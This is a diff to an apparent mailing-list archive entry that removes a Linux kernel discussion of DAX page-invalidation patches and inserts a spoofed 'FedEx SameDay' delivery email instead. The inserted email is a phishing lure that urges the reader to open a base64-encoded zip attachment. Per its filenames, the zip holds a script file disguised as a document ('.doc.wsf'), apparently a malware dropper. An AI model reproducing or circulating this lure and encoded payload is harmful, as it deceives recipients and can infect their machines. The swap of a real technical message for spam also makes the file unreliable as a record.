@@ -1,70 +1,94 @@
-From: Dan Williams <dan.j.williams@intel.com>
-Subject: Re: [PATCH 0/6 v3] dax: Page invalidation fixes
-Date: Fri, 16 Dec 2016 17:49:47 -0800
-Message-ID: <CAPcyv4iA78SAaNQC82NTziJFWX0mzq2wq6bFrXcn_3iiESOEzw@mail.gmail.com>
-References: <20161212164708.23244-1-jack@suse.cz> <20161213115209.GG15362@quack2.suse.cz>
- <CAPcyv4giLyY8pWP09V5BmUM+sfGO-VJCtkfV6L-RFS+0XQsT9Q@mail.gmail.com> <CAPcyv4jqN+GkO7pL0QE0vM50MmqPZ1aD2G3YmziKvp+4+oh5gQ@mail.gmail.com>
+From: "FedEx SameDay" <martin.newman@zavodeliya.ru>
+Subject: Parcel ID00663101 delivery problems, please review
+Date: Sat, 17 Dec 2016 12:27:39 +0300
+Message-ID: <d5aa8ae913ca9cf85a5531c2fb455655@zavodeliya.ru>
+Reply-To: "FedEx SameDay" <martin.newman@zavodeliya.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Cc: linux-fsdevel <linux-fsdevel@vger.kernel.org>,
-	Ross Zwisler <ross.zwisler@linux.intel.com>, Linux MM <linux-mm@kvack.org>,
-	linux-ext4 <linux-ext4@vger.kernel.org>, Johannes Weiner <hannes@cmpxchg.org>,
-	"linux-nvdimm@lists.01.org" <linux-nvdimm@lists.01.org>
-To: Jan Kara <jack@suse.cz>
-Return-path: <owner-linux-mm@kvack.org>
-In-Reply-To: <CAPcyv4jqN+GkO7pL0QE0vM50MmqPZ1aD2G3YmziKvp+4+oh5gQ@mail.gmail.com>
-Sender: owner-linux-mm@kvack.org
-List-Id: linux-ext4.vger.kernel.org
+Content-Type: multipart/mixed;
+        boundary="b1_89bb1a3a39b93059da899b3ddfce44cb"
+Content-Transfer-Encoding: 8bit
+To: linux-ext4@vger.kernel.org
+Return-path: <linux-ext4-owner@vger.kernel.org>
+Received: from host-85-172-190-154.stv.ru ([85.172.190.154]:23231 "EHLO
+        webserver.freebsd.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with ESMTP id S1754197AbcLQKGZ (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>); Sat, 17 Dec 2016 05:06:25 -0500
+Received: from webserver.freebsd.ru (localhost [127.0.0.1])
+        by webserver.freebsd.ru (8.14.9/8.14.9) with ESMTP id uBH9RebI094271
+        (version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=NO)
+        for <linux-ext4@vger.kernel.org>; Sat, 17 Dec 2016 12:27:40 +0300 (MSK)
+        (envelope-from ftpwww@webserver.freebsd.ru)
+Sender: linux-ext4-owner@vger.kernel.org
+List-ID: <linux-ext4.vger.kernel.org>
 
-On Fri, Dec 16, 2016 at 5:35 PM, Dan Williams <dan.j.williams@intel.com> wrote:
-> On Tue, Dec 13, 2016 at 10:57 AM, Dan Williams <dan.j.williams@intel.com> wrote:
->> On Tue, Dec 13, 2016 at 3:52 AM, Jan Kara <jack@suse.cz> wrote:
->>> On Mon 12-12-16 17:47:02, Jan Kara wrote:
->>>> Hello,
->>>>
->>>> this is the third revision of my fixes of races when invalidating hole pages in
->>>> DAX mappings. See changelogs for details. The series is based on my patches to
->>>> write-protect DAX PTEs which are currently carried in mm tree. This is a hard
->>>> dependency because we really need to closely track dirtiness (and cleanness!)
->>>> of radix tree entries in DAX mappings in order to avoid discarding valid dirty
->>>> bits leading to missed cache flushes on fsync(2).
->>>>
->>>> The tests have passed xfstests for xfs and ext4 in DAX and non-DAX mode.
->>>>
->>>> Johannes, are you OK with patch 2/6 in its current form? I'd like to push these
->>>> patches to some tree once DAX write-protection patches are merged.  I'm hoping
->>>> to get at least first three patches merged for 4.10-rc2... Thanks!
->>>
->>> OK, with the final ack from Johannes and since this is mostly DAX stuff,
->>> can we take this through NVDIMM tree and push to Linus either late in the
->>> merge window or for -rc2? These patches require my DAX patches sitting in mm
->>> tree so they can be included in any git tree only once those patches land
->>> in Linus' tree (which may happen only once Dave and Ted push out their
->>> stuff - this is the most convoluted merge window I'd ever to deal with ;-)...
->>> Dan?
->>>
->>
->> I like the -rc2 plan better than sending a pull request based on some
->> random point in the middle of the merge window. I can give Linus a
->> heads up in my initial nvdimm pull request for -rc1 that for
->> coordination purposes we'll be sending this set of follow-on DAX
->> cleanups for -rc2.
->
-> So what's still pending for -rc2? I want to be explicit about what I'm
-> requesting Linus be prepared to receive after -rc1. The libnvdimm pull
-> request is very light this time around since I ended up deferring the
-> device-dax-subdivision topic until 4.11 and sub-section memory hotplug
-> didn't make the cutoff for -mm. We can spend some of that goodwill on
-> your patches ;-).
->
-> I can roll them into libnvdimm-for-next now for the integration
-> testing coverage, rebase to -rc1 when it's out, wait for your thumbs
-> up on the testing and send a pull request on the 23rd.
+--b1_89bb1a3a39b93059da899b3ddfce44cb
+Content-Type: text/plain; charset=us-ascii
 
-Sorry, I meant the 30th of December.
+Dear Customer,
 
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+This is to confirm that your item has been shipped at December 14.
+
+Please check delivery label attached!
+
+With sincere thanks,
+Martin Newman,
+Parcels Operation Agent.
+
+
+--b1_89bb1a3a39b93059da899b3ddfce44cb
+Content-Type: application/zip; name="Delivery-Details-00663101.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Delivery-Details-00663101.zip
+
+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
+
+
+--b1_89bb1a3a39b93059da899b3ddfce44cb--
+
